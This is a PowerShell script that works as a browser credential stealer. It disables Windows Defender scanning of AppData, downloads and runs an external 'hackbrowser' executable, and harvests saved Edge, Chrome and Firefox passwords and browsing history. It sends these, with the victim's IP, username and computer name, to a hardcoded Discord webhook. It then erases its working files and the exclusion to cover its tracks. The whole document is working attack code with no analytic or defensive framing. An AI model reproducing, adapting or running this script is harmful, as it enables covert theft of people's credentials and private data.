# Add Windows Defender exclusion
Add-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue

# Create working directory
mkdir "$env:appdata\Microsoft\dump" -Force
Set-Location "$env:appdata\Microsoft\dump"

# Download and run HackBrowser
Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item "hb.exe" -Force

# Get victim info
$ip = try { (Invoke-RestMethod "http://ifconfig.me/ip").Trim() } catch { "Unknown" }
$username = $env:USERNAME
$computer = $env:COMPUTERNAME

# Discord webhook
$webhook = "https://discord.com/api/webhooks/1480287085771620606/WtlPfAW2q0H_-PmPD8AG6axb7k_iHbzmkg46kiomUxskavkfn7yCXoKaP_VtssBE0mJ9"

# Parse and format credentials nicely
cd results

$formattedCreds = ""
$passwordCount = 0

# Check Edge passwords
if (Test-Path "microsoft_edge_password.json") {
    $edgePass = Get-Content "microsoft_edge_password.json" | ConvertFrom-Json
    foreach ($cred in $edgePass) {
        $formattedCreds += "🔷 **Edge** | ``$($cred.url)```n"
        $formattedCreds += "   👤 User: ``$($cred.username)```n"
        $formattedCreds += "   🔑 Pass: ``$($cred.password)```n`n"
        $passwordCount++
    }
}

# Check Chrome passwords
if (Test-Path "chrome_password.json") {
    $chromePass = Get-Content "chrome_password.json" | ConvertFrom-Json
    foreach ($cred in $chromePass) {
        $formattedCreds += "🔵 **Chrome** | ``$($cred.url)```n"
        $formattedCreds += "   👤 User: ``$($cred.username)```n"
        $formattedCreds += "   🔑 Pass: ``$($cred.password)```n`n"
        $passwordCount++
    }
}

# Check Firefox passwords
if (Test-Path "firefox_password.json") {
    $ffPass = Get-Content "firefox_password.json" | ConvertFrom-Json
    foreach ($cred in $ffPass) {
        $formattedCreds += "🦊 **Firefox** | ``$($cred.url)```n"
        $formattedCreds += "   👤 User: ``$($cred.username)```n"
        $formattedCreds += "   🔑 Pass: ``$($cred.password)```n`n"
        $passwordCount++
    }
}

if ($passwordCount -eq 0) {
    $formattedCreds = "⚠️ No saved passwords found"
}

# Get history count
$historyCount = 0
if (Test-Path "microsoft_edge_history.json") {
    $history = Get-Content "microsoft_edge_history.json" | ConvertFrom-Json
    $historyCount = $history.Count
}

# Send beautiful Discord embed
$payload = @{
    embeds = @(
        @{
            title = "🎯 NEW VICTIM COMPROMISED"
            color = 15158332
            fields = @(
                @{
                    name = "👤 Username"
                    value = "``$username``"
                    inline = $true
                }
                @{
                    name = "🖥️ Computer"
                    value = "``$computer``"
                    inline = $true
                }
                @{
                    name = "🌐 IP Address"
                    value = "``$ip``"
                    inline = $false
                }
                @{
                    name = "📊 Statistics"
                    value = "🔑 **$passwordCount** passwords | 📜 **$historyCount** history items"
                    inline = $false
                }
            )
            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
        },
        @{
            title = "🔑 Stolen Credentials"
            description = $formattedCreds
            color = 16776960
        }
    )
} | ConvertTo-Json -Depth 10

Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json; charset=utf-8'

# Also send raw JSON files for complete data
Start-Sleep -Seconds 2

$files = Get-ChildItem -Filter "*.json"
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    if ($content.Length -gt 10 -and $content.Length -lt 1800) {
        $msg = @{
            content = "**📎 Raw Data: $($file.Name)**``````json`n$content``````"
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Seconds 1
    }
}  # <-- ADDED THIS CLOSING BRACE

# Cleanup
cd "$env:appdata"
Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue
